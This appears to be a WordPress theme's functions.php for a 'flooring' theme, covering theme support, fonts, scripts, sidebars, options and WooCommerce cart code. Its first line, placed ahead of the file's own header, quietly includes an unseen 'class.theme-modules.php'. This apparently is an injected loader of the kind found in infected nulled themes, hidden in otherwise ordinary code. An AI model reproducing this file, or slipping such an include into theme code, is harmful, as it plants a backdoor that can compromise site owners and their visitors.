<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *----------------- include ------------------------------------------
 */


include_once(get_template_directory() . '/inc/tools.php');
include_once(get_template_directory() . '/inc/plugins/plugins.php');
include_once(get_template_directory() . '/inc/panel.php');
include_once(get_template_directory() . '/inc/meta-box.php');
include_once(get_template_directory() . '/inc/walker/flooring_walker.php');

load_theme_textdomain("flooring", get_template_directory() . '/languages');


/**
 *--------------------------------------------------------------------
 */
/**
 * Sets up the content width value based on the theme's design and stylesheet.
 */
if (!isset($content_width))
  $content_width = 625;

/* Add post formats */

if (function_exists('add_theme_support')) {
  add_theme_support('post-thumbnails');
  add_theme_support('post-formats', array('gallery', 'link', 'quote', 'video', 'audio'));
  add_theme_support('automatic-feed-links');
  add_theme_support('custom-background');
  add_theme_support('title-tag');
  add_theme_support('html5', array('search-form'));
  add_theme_support('woocommerce');
  add_theme_support('wc-product-gallery-zoom');
  add_theme_support('wc-product-gallery-lightbox');
  add_theme_support('wc-product-gallery-slider');
  add_theme_support('editor-styles');
  add_editor_style('editor.css');
  add_theme_support('align-wide');
  // -- Disable custom font sizes
  add_theme_support('disable-custom-font-sizes');

// -- Editor Font Sizes
  add_theme_support('editor-font-sizes', array(
    array(
      'name' => __('small', 'flooring'),
      'shortName' => __('S', 'flooring'),
      'size' => 14,
      'slug' => 'small'
    ),
    array(
      'name' => __('regular', 'flooring'),
      'shortName' => __('M', 'flooring'),
      'size' => 16,
      'slug' => 'regular'
    ),
    array(
      'name' => __('large', 'flooring'),
      'shortName' => __('L', 'flooring'),
      'size' => 18,
      'slug' => 'large'
    ),
  ));

// -- Editor Color Palette
  add_theme_support( 'editor-color-palette', array(
    array(
      'name'  => __( 'Primary Color:', 'flooring' ),
      'slug'  => 'primary',
      'color'	=> 'rgba(182,112,42,1)',
    ),
    array(
      'name'  => __( 'Secondary Color:', 'flooring' ),
      'slug'  => 'secondary',
      'color' => '#58AD69',
    ),
  ) );

}

/*
 * ----------header title----------
 */
function flooring_wp_title_for_home($flooring_title, $flooring_sep)
{
  global $paged, $page;
  if (is_feed())
    return $flooring_title;


  // Add the site description for the home/front page.
  $site_description = get_bloginfo('name', 'display');
  if ($site_description && (is_home() || is_front_page()))
    $flooring_title = esc_html__('Home - ', 'flooring') . "$flooring_title $flooring_sep $site_description";

  return $flooring_title;
}

add_filter('wp_title', 'flooring_wp_title_for_home', 10, 2);


/**
 *--------------- Image presets-----------
 */

add_image_size('flooring_blog-thumb', 840, 424, true);
add_image_size('flooring_blog', 368, 193, true);
add_image_size('flooring_portfolio', 380, 254, true);
add_image_size('flooring_portfolio_760x500', 760, 500, true);
add_image_size('flooring_testimonial', 250, 250, true);
add_image_size('flooring_team', 270, 322, true);

add_action('init', 'add_image_sizes');
function add_image_sizes()
{
  add_image_size('540wide', 380);
  add_image_size('440wide', 380);
  add_image_size('690wide', 690);

}

/**
 *-----------------add sidebar------------------------------------------
 */

function flooring_widgets_init()
{
  register_sidebar(array(
    'name' => esc_html__('Sidebar', 'flooring'),
    'id' => 'sidebar',
    'before_widget' => '<section id="%1$s" class="widget %2$s">',
    'after_widget' => '</section>',
    'before_title' => '<h2 class="block-title">',
    'after_title' => '</h2>',
  ));
  register_sidebar(array(
    'name' => esc_html__('Footer 1', 'flooring'),
    'id' => 'footer-1',
    'before_widget' => '<li>',
    'after_widget' => '</li>',
    'before_title' => '<h2 class="block-title">',
    'after_title' => '</h2>',
  ));

  register_sidebar(array(
    'name' => esc_html__('Footer 2', 'flooring'),
    'id' => 'footer-2',
    'before_widget' => '<li>',
    'after_widget' => '</li>',
    'before_title' => '<h2 class="block-title">',
    'after_title' => '</h2>',
  ));
  register_sidebar(array(
    'name' => esc_html__('Footer 3', 'flooring'),
    'id' => 'footer-3',
    'before_widget' => '<li>',
    'after_widget' => '</li>',
    'before_title' => '<h2 class="block-title">',
    'after_title' => '</h2>',
  ));
  register_sidebar(array('name' => esc_html__('Woocommerce Sidebar', 'flooring'),
    'id' => 'shop-widgets',
    'description' => esc_html__('Appears on the shop page of your website.', 'flooring'),
    'before_widget' => '<div id="%1$s" class="widget %2$s shop-widgets">',
    'after_widget' => '</div>',
    'before_title' => '<h4 class="widget-title">',
    'after_title' => '</h4>',
  ));
}

add_action('widgets_init', 'flooring_widgets_init');


//____________navigation____________

register_nav_menus(array(
  'primary' => esc_html__('Primary Navigation', 'flooring'),
));
function flooring_main_menu_fallback()
{
  echo '<div class="empty-menu">';
  echo __('Please assign a menu to the primary menu location under ', 'flooring'); ?>
  <a
    href="<?php echo get_admin_url(get_current_blog_id(), 'nav-menus.php') ?>"><?php echo esc_html__('Menus Settings', 'flooring'); ?></a>
  </div> <?php
}

function flooring_register_flooring_menu()
{
  register_nav_menu('footer', esc_html__('Footer', 'flooring'));
}

add_action('init', 'flooring_register_flooring_menu');
//--------load css and js----------------------------
function flooring_theme_add_editor_styles()
{
  add_editor_style('custom-editor-style.css');
}

add_action('admin_init', 'flooring_theme_add_editor_styles');

function flooring_fonts_url($font_body_name, $flooring_font_weight_style, $flooring_main_text_font_subsets)
{
  $font_url = '';

  /*
  Translators: If there are characters in your language that are not supported
  by chosen font(s), translate this to 'off'. Do not translate into your own language.
   */
  if ('off' !== _x('on', 'Google font: on or off', 'flooring')) {
    $font_url = add_query_arg('family', urlencode($font_body_name . ':' . $flooring_font_weight_style . '&subset=' . $flooring_main_text_font_subsets), "https://fonts.googleapis.com/css");
  }
  return $font_url;
}


function flooring_load_js_css_file()
{


  /*----------google -fonts ------------------*/
  $flooring_font_body_name = flooring_get_option('flooring_body_font_familly', 'Open Sans');
  $flooring_font_weight_style = flooring_get_option('flooring_body_font_weight_list', '400');
  $flooring_main_text_font_subsets = flooring_get_option('flooring_main-text-font-subsets', 'latin');

  $font_header_name = flooring_get_option('flooring_head_font_familly', 'Open Sans');
  $flooring_heading_font_weight_style = flooring_get_option('flooring_heading-font-weight-style-list', '400');
  $flooring_heading_text_font_subsets = flooring_get_option('flooring_heading-text-font-subsets', 'latin');

  $flooring_navigation_font_familly = flooring_get_option('flooring_navigation_font_familly', 'Open Sans');
  $flooring_navigation_font_weight_style = flooring_get_option('flooring_navigation-font-weight-style-list', '400');
  $flooring_navigation_text_font_subsets = flooring_get_option('flooring_navigation-text-font-subsets', 'latin');


  $flooring_protocol = is_ssl() ? 'https' : 'http';
  if (is_rtl()) {
    wp_enqueue_style('flooring_body_google_fonts', $flooring_protocol . '://fonts.googleapis.com/earlyaccess/droidarabickufi.css');

  } elseif ($flooring_font_body_name != "default" && $flooring_font_weight_style != "") {
    if($flooring_font_body_name==""){
      $flooring_font_body_name='Open+Sans,400,300,700';
    }
    wp_enqueue_style('flooring_body_google_fonts', flooring_fonts_url($flooring_font_body_name, $flooring_font_weight_style, $flooring_main_text_font_subsets), array(), '1.0.0');
  } else {
    wp_enqueue_style('wd-fonts-body', flooring_fonts_url('Open Sans', '400,300,700', 'latin,latin-ext'), array(), '1.0.0');
  }


  if ($font_header_name != "default" && $flooring_heading_font_weight_style != "") {
    wp_enqueue_style('flooring_header_google_fonts', flooring_fonts_url($font_header_name, $flooring_heading_font_weight_style, $flooring_main_text_font_subsets), array(), '1.0.0');
  }

  if ($flooring_navigation_font_familly != "default" && $flooring_navigation_font_weight_style != "") {
    wp_enqueue_style('flooring_navigation_google_fonts', flooring_fonts_url($flooring_navigation_font_familly, $flooring_navigation_font_weight_style, $flooring_navigation_text_font_subsets), array(), '1.0.0');
  }


  //________________________css______________________________
  wp_enqueue_style('flooring-woocommerce', get_template_directory_uri() . "/stylesheets/woocommerce.css");
  wp_enqueue_style('owl-carousel', get_template_directory_uri() . "/stylesheets/owl.carousel.css");
  wp_enqueue_style('owl-theme', get_template_directory_uri() . "/stylesheets/owl.theme.css");
  wp_enqueue_style('animate', get_template_directory_uri() . "/stylesheets/animate.css");
  wp_enqueue_style('swiper', get_template_directory_uri() . "/stylesheets/swiper.min.css");
  wp_enqueue_style('font-awesome', get_template_directory_uri() . "/stylesheets/font-awesome/font-awesome.min.css");
  wp_enqueue_style('flooring-app', get_template_directory_uri() . "/stylesheets/app.css");

  //________________________js______________________________
  $flooring_google_map_key = flooring_get_option('google_map_key', '');
  wp_enqueue_script('googleapis',$flooring_protocol . "://maps.googleapis.com/maps/api/js?key=" . $flooring_google_map_key . "&callback=initMap", array('jquery'), 3, true);
  wp_enqueue_script('flooring-plugins', get_template_directory_uri() . '/js/plugins.js', array('jquery', 'hoverIntent'));
  wp_enqueue_script('flooring-script-shortcodes', get_template_directory_uri() . "/js/shortcode/script-shortcodes.js", array('jquery'));

  wp_enqueue_script('flooring-wd-owlcarouse', get_template_directory_uri() . "/js/wd_owlcarousel.js", array('jquery'));

  wp_enqueue_script('flooring-scripts', get_template_directory_uri() . '/js/scripts.js', array('jquery'));
  if (is_singular() && get_option('thread_comments'))
    wp_enqueue_script('comment-reply');

  //________________________inline style______________________________
  wp_enqueue_style('flooring-style', get_template_directory_uri() . '/style.css');

  include_once(get_template_directory() . '/inc/custom-style.php');

  wp_add_inline_style('flooring-style', $flooring_custom_css);
}

add_action('wp_enqueue_scripts', 'flooring_load_js_css_file');


// initialize options
if (!function_exists('flooring_initialize_options')) {
  function flooring_initialize_options()
  {
    $options_arrays = array();
    $options_arrays = get_option("flooring_options_array");
    if (!$options_arrays) {

      $options_array = array(

        'flooring_primary_color' => "",
        'flooring_secondary_color' => "",
        'flooring_logo_path' => "",
        'flooring_favicon_icon_path' => "",
        'flooring_menu_style' => "",
        'flooring_show_min_cart' => "",
        'flooring_facebook' => "",
        'flooring_twitter' => "",
        'flooring_google_plus' => "",
        'flooring_body_font_familly' => "",
        'flooring_body_font_weight' => "",
        'flooring_main-text-font-subsets' => "",
        'flooring_head_font_familly' => "",
        'flooring_heading-font-weight-style' => "",
        'flooring_heading-text-font-subsets' => "",
        'flooring_navigation_font_familly' => "",
        'flooring_navigation-font-weight-style' => "",
        'flooring_navigation-text-font-subsets' => "",
        "flooring_theme_custom_css" => "",
        'flooring_theme_custom_js' => "",
        'flooring_footer_columns' => "",
        'flooring_nav_bg_color' => '',
        'flooring_copyright' => "",
      );
      update_option("flooring_options_array", $options_array);
    }
  }
}


// get options value
if (!function_exists('flooring_get_option')) {
  function flooring_get_option($flooring_option_key, $flooring_option_default_value = null)
  {
    flooring_initialize_options();
    $options_array = get_option("flooring_options_array");
    $flooring_meta_value = "";

    // for demo purpose
    if (function_exists("wd_custom_options")) {
      $options_array = wd_custom_options($options_array);
    }

    if (array_key_exists($flooring_option_key, $options_array)) {
      if (isset($options_array[$flooring_option_key]) && !empty($options_array[$flooring_option_key])) {
        $flooring_meta_value = esc_attr($options_array[$flooring_option_key]);
      }

      if ($flooring_meta_value == "") {
        $flooring_meta_value = $flooring_option_default_value;
      }
    }

    return $flooring_meta_value;
  }
}

// get options value
if (!function_exists('flooring_save_option')) {
  function flooring_save_option($flooring_option_key, $flooring_option_value)
  {
    $options_array = get_option("flooring_options_array");
    $options_array[$flooring_option_key] = $flooring_option_value;
    update_option("flooring_options_array", $options_array);
  }
}


/*---------wooocomerce---------*/
//Reposition WooCommerce breadcrumb 
function flooring_woocommerce_remove_breadcrumb()
{
  remove_action(
    'woocommerce_before_main_content', 'woocommerce_breadcrumb', 20);
}

add_action(
  'woocommerce_before_main_content', 'flooring_woocommerce_remove_breadcrumb'
);

function flooring_woocommerce_custom_breadcrumb()
{
  woocommerce_breadcrumb();
}

add_action('woo_custom_breadcrumb', 'flooring_woocommerce_custom_breadcrumb');


// Ensure cart contents update when products are added to the cart via AJAX (place the following in functions.php)
add_filter('woocommerce_add_to_cart_fragments', 'flooring_woocommerce_header_add_to_cart_fragment');

function flooring_woocommerce_header_add_to_cart_fragment($fragments)
{
  ob_start();
  ?>
  <a class="cart-contents" href="<?php echo WC()->cart->get_cart_url(); ?>"
     title="<?php esc_html_e('View your shopping cart', 'flooring'); ?>"><?php echo sprintf(_n('%d item', '%d items', WC()->cart->cart_contents_count, 'flooring'), WC()->cart->cart_contents_count); ?>
    - <?php echo WC()->cart->get_cart_total(); ?></a>
  <?php

  $fragments['a.cart-contents'] = ob_get_clean();

  return $fragments;
}




function flooring_theme_custom_js()
{ ?>

  <script type="text/javascript">
    <?php echo flooring_get_option('flooring_theme_custom_js') ?>
  </script>
  <?php
}

add_action('wp_footer', 'flooring_theme_custom_js');

